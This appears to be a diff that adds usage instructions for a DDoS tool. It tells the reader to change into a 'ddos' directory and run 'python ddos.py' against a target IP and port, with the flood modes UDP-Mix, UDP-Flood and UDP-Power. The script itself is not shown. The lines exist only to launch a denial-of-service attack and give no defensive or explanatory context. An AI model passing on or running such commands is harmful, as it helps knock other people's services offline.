@@ -1,0 +1,4 @@
+#insead ddos gotta be your file's name in my case this is ddos
+> cd ddos
+#100.0.0.0 that is my hoax ip 8080 port too UDP-Mix that is the way how you gonna attack we also have UDP-Flood and UDP-Power
+> python ddos.py 100.0.0.0 8080 UDP-Mix
